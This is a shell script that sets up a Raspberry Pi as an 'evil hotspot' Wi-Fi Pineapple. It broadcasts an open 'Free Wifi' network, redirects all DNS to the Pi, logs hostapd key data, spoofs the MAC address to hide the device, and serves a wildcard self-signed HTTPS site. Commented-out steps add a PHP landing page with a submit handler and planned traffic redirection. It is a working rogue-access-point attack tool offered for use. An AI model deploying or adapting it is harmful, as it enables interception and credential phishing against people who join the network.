#!/bin/sh

# This program was written by Jason Sholler

# Please use responsibly, I am not liable for any damages caused

# Functions that define the core of the program

welcome_message()
{
	# Welcome the user with a whiptail box
	whiptail --title "Pi Wifi Pineapple" --msgbox "This script automatically sets up the Raspberry Pi to be an evil hotspot.\\n\nThis means people can connect to it and you can see them connecting." 12 60
}

preinstall_message()
{
	# Final installation message before installing
	whiptail --yesno "This is the last prompt before installation begins. Continue?" 10 30
}

get_dependants()
{
	apt-get install dnsmasq hostapd php7.0
}

make_hostapd_conf()
{
        # Create the hostapd.conf file - This sets the wifi interface to broadcast an SSID
        printf "interface=wlan0\nssid=Free Wifi\nchannel=1" > /etc/hostapd/hostapd.conf
}

change_initd_hostapd()
{
        # This points the init.d/hostapd to use the newly created configuration in make_hostapd_conf()
        sed -i 's/^\(DAEMON\_CONF=\).*$/\1\/etc\/hostapd\/hostapd\.conf/' /etc/init.d/hostapd
}

change_hostapd_daemon()
{
        # Edit the /etc/default/hostapd file with line 'DAEMON_OPTS="-t -d -K -f /var/log/hostapd.log"
        # First make a back up of the file
        # -t = Time, -d = Debug, -K = Key Data, -f = File
        mv /etc/default/hostapd /etc/default/hostapd.bak
        printf 'DAEMON_OPTS="-t -d -K -f /var/log/hostapd.log"' >> /etc/default/hostapd
}

change_dnsmasq_conf()
{
        # Move the file for backup
        mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak
        # Create the new configuration file for dnsmasq
        printf "address=/#/10.0.0.1\ninterface=wlan0\ndhcp-range=wlan0,10.0.0.2,10.0.0.254,12h" > /etc/dnsmasq.conf
}

change_dhcpcd_conf()
{
        # Edit /etc/dhcpcd.conf to set a static IP Address on wlan0
        printf "interface wlan0\nstatic ip_address=10.0.0.1/24\nstatic domain_name_servers=10.0.0.1" >> /etc/dhcpcd.conf
}

update_rcd()
{
        update-rc.d apache2 defaults
        update-rc.d hostapd defaults
        update-rc.d dnsmasq defaults
}

change_mac()
{
        # The default MAC of a Pi clearly indicates that it is a Raspberry Pi
        # Here we add a small command to .bashrc to always have this weird random MAC
        # Address on boot, if you look it up it doesn't say it is anything
        echo "sudo ifconfig wlan0 hw ether 02:ab:cd:ef:12:30" >> /home/pi/.bashrc;
}

setup_apache2()
{
	# Directory to store the SSL Certificates / Key
        mkdir /etc/apache2/ssl;
        openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/server.crt -keyout /etc/apache2/ssl/server.key -subj "/C=/ST=/L=/O=/OU=/CN=*"
        a2enmod ssl
        ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/000-default-ssl.conf
}

begin_installation()
{
	{
		get_dependants >> /dev/null 2>&1
		make_hostapd_conf >> /dev/null 2>&1
		change_initd_hostapd >> /dev/null 2>&1
		change_hostapd_daemon >> /dev/null 2>&1
		change_dnsmasq_conf >> /dev/null 2>&1
		change_dhcpcd_conf >> /dev/null 2>&1
		update_rcd >> /dev/null 2>&1
		change_mac >> /dev/null 2>&1
		id="0"
		while (true)
		do
			proc=$(ps aux | grep -v grep | grep -e "piwifi")
			if [[ "$proc" == "" ]]; then break; fi
		sleep 1
		echo $i
		i=$(expr $i + 1)
		done
		echo 100
		sleep 1
	} | whiptail --title "Installing" --gauge "Installing the application" 8 60 0
}

edit_apache2_conf()
{
 	sed -i 's/^\(SSLCertificateFile\t\).*$/\1\/etc\/apache2\/ssl\/server.crt/' /etc/apache2/sites-enabled/000-default-ssl.conf
}

# create_landing_page()
# {
# 	chmod 777 /var/www/html
# 	rm /var/www/html/index.html
# 	mv ./submit.php /var/www/html/submit.php
# 	mv ./index.php /var/www/html/index.php
# }

# # TODO: Update IPTables to forward all requests back to 10.0.0.1 (Or maybe we can add a new hostname to our PI and redirect to its hostname so people think they cannot login
# update_iptables()
# {
# }

# Start of the main script

# Check if root
if [ "$(whoami)" != "root" ]; then
        whiptail --msgbox "Sorry you are not root. You must type: sudo bash piwifipineapple.sh" 10 40 1
        exit 1
fi

welcome_message

if (preinstall_message -eq 0); then
	begin_installation
else
	exit 1
fi
